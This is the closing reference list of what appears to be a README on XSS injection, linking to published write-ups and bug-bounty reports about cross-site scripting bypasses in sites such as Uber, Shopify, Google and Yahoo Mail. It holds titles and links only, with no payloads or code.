  - [Using a Braun Shaver to Bypass XSS Audit and WAF - Frans Rosen - April 19, 2016](http://web.archive.org/web/20160810033728/https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify)\n\
  - [Ways to alert(document.domain) - Tom Hudson (@tomnomnom) - February 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)\n\
  - [Write-up of DOMPurify 2.0.0 bypass using mutation XSS - Michał Bentkowski - September 20, 2019](https://web.archive.org/web/20250810032340/https://research.securitum.com/dompurify-bypass-using-mxss/)\n\
  - [XSS by Tossing Cookies - WeSecureApp - July 10, 2017](https://web.archive.org/web/20260107083030/https://wesecureapp.com/blog/xss-by-tossing-cookies/)\n\
  - [XSS ghettoBypass - d3adend - September 25, 2015](https://web.archive.org/web/20150925094640/http://d3adend.org:80/xss/ghettoBypass)\n\
  - [XSS in Uber via Cookie - zhchbin - August 30, 2017](https://web.archive.org/web/20260206200641/https://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/)\n\
  - [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener - Luke Young (bored-engineer)\
  \ - May 23, 2017](https://web.archive.org/web/20260216061600/https://hackerone.com/reports/231053)\n- [XSS via Host header\
  \ - www.google.com/cse - Michał Bentkowski - April 22, 2015](https://web.archive.org/web/20150503190425/http://blog.bentkowski.info:80/2015/04/xss-via-host-header-cse.html)\n\
  - [Xssing Web With Unicodes - Rakesh Mane - August 3, 2017](https://web.archive.org/web/20260217134740/https://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)\n\
  - [Yahoo Mail stored XSS - Jouko Pynnönen - January 19, 2016](https://web.archive.org/web/20210507223107/https://klikki.fi/adv/yahoo.html)\n\
  - [Yahoo Mail stored XSS #2 - Jouko Pynnönen - December 8, 2016](https://web.archive.org/web/20210816155224/https://klikki.fi/adv/yahoo2.html)"
_relative_path: XSS Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/README.md
````
